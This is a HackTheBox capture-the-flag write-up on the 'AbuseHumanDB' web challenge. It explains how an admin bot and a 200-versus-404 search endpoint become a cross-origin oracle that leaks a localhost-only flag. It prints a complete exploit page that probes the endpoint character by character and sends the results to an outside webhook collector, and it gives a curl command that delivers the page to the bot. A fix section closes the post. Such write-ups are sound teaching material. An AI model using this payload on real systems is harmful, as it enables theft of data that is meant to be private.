---
title: "AbuseHumanDB"
date: 2027-05-20 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xs-search, xs-leak, status-oracle, admin-bot, broken-access-control]
description: "An Easy Web challenge: the flag is a database row visible only to localhost, and a 'visit my URL' admin bot is the bridge. A search endpoint's 200-vs-404 status becomes a cross-origin boolean oracle via <script> onload/onerror, brute-forcing the flag char-by-char."
---

## Overview

**AbuseHumanDB** is an Easy HackTheBox **Web** challenge. The flag lives in the database
as an *unapproved* row that the app only reveals to requests coming from `localhost`. There's
no SQL injection and no CORS to abuse — instead, an admin "visit my URL" bot becomes the
localhost, and a search endpoint's HTTP **status code** (200 on a match, 404 on a miss) is
turned into a cross-origin boolean oracle to leak the flag one character at a time. This is a
classic [XS-Search / XS-Leak](https://cwe.mitre.org/data/definitions/203.html).

## The technique

Two facts from the source drive everything:

1. **The flag is localhost-only.** Visibility is gated on the *network position* of the
   request — a [broken-access-control](https://cwe.mitre.org/data/definitions/863.html) decision:

   ```js
   const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);
   // listEntries(isLocalhost(req)) / getEntry(q, isLocalhost(req))
   //   localhost -> 0 -> returns approved=0 rows  (THE FLAG)
   //   remote    -> 1 -> returns only approved=1 rows (boring)
   ```

   As a remote attacker we can never see the flag directly.

2. **There's an admin bot.** `POST /api/entries` takes a `url` and makes a headless
   (puppeteer) bot visit it. The bot runs *on the box*, so to the app it **is** localhost — it
   sees the unapproved flag row. We can't read the bot's screen, so we need the bot to leak
   the flag to us.

The leak primitive is the search endpoint. `GET /api/entries/search?q=X` runs
`title LIKE 'X%'` and returns **HTTP 200** when a row matches the prefix, **HTTP 404** when
nothing does. There's no CORS, so attacker JavaScript can't read the JSON body cross-origin —
**but** a cross-origin `<script src=...>` tag fires `onload` on a 200 and `onerror` on a 404.
The HTTP *status* leaks across origins. That's a boolean oracle: *"does the flag start with
this prefix?"* And because the **bot** issues the searches, the oracle runs against the
`approved=0` rows — i.e. against the flag.

## Solution

Host a page, get the bot to load it, and from inside the bot brute-force the flag prefix one
character at a time, exfiltrating each confirmed character back out.

Create `exploit.html` (the bot runs this):

```html
<!DOCTYPE html><html><body><script>
var WH = "https://webhook.site/<collector-token>";
var CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}!@#$^&*()-+=:;.,?";
var TARGET = "http://127.0.0.1:1337/api/entries/search?q=";
function out(m){ new Image().src = WH + "?" + m + "&t=" + Date.now(); }
function probe(p){ return new Promise(function(r){ var s=document.createElement("script");
  s.src=TARGET+encodeURIComponent(p);
  s.onload =function(){s.remove();r(true);};   // 200 -> prefix matches
  s.onerror=function(){s.remove();r(false);};  // 404 -> no match
  document.head.appendChild(s); }); }
(async function(){
  var known = "HTB{";
  for (var pos=0; pos<60; pos++){
    var found = null;
    var tries = CHARSET.split("").map(async function(c){ var hit=await probe(known+c); if(hit && found===null) found=c; });
    await Promise.all(tries);                    // parallel: ~one round-trip per position
    if (found===null){ var w=await probe(known+"_"); if(!w){ out("done="+encodeURIComponent(known)); break; } found="_"; }
    known += found;
    out("flag="+encodeURIComponent(known));
    if (found==="}"){ out("FLAG="+encodeURIComponent(known)); break; }
  }
})();
</script></body></html>
```

Submit it to the bot:

```bash
curl -s -X POST http://<target>/api/entries \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://<no-csp-host>/exploit.html"}'
```

Then read the exfiltrated characters off the collector and reassemble:

```
HTB{...}     # the flag value (redacted)
```

Three traps that decide whether this works:

- **`LIKE` has no `ESCAPE` clause**, so `%` (zero-or-more) and `_` (one char) are wildcards.
  `%` must be **excluded** from the guess charset — otherwise it matches every position and
  silently corrupts the result. A genuine `_` in the flag is recovered with a fallback probe
  (`known+'_'` still matches ⇒ the char is some single char no concrete guess hit).
- **`{` and `}` must be in the charset**, or the closing brace gets misread as the `_`
  fallback and the loop never cleanly finds the end.
- **Delivery + CSP.** The headless bot reaches normal public sites fine, but a host that
  serves `Content-Security-Policy: script-src 'none'` will block your script from running
  (it can still be used purely as the receive-side collector). Host the script on a no-CSP
  origin the bot executes, and exfiltrate to the collector. Loopback (`127.0.0.1`) is exempt
  from HTTPS mixed-content blocking, so the `http://` probes run fine from an `https://` page.

## Why it worked

The app treats the *network position* of a request (`req.ip == 127.0.0.1`) as authorization to
see secret data, then hands a browser-driven oracle (a status-code search) to anyone who can
make the localhost browser run their JavaScript. The admin bot is exactly that bridge:
**"visit my URL"** turns the attacker into the localhost, and `<script>` error events expose
the 200/404 distinction across origins even with no CORS.

## Fix / defense

- **Don't authorize by network position.** Use real authentication/authorization for "see
  unapproved entries", not `req.ip == 127.0.0.1`.
- **Kill the oracle:** return a uniform status (always 200 with an empty array) for search hit
  vs miss, and require auth on `/api/entries/search`.
- **Parameterize the wildcard surface:** add an `ESCAPE` clause and escape `%`/`_` in user
  input so `LIKE` can't be abused as a prefix oracle.
- **Segregate the admin bot** so it never shares a loopback trust boundary with secret data.
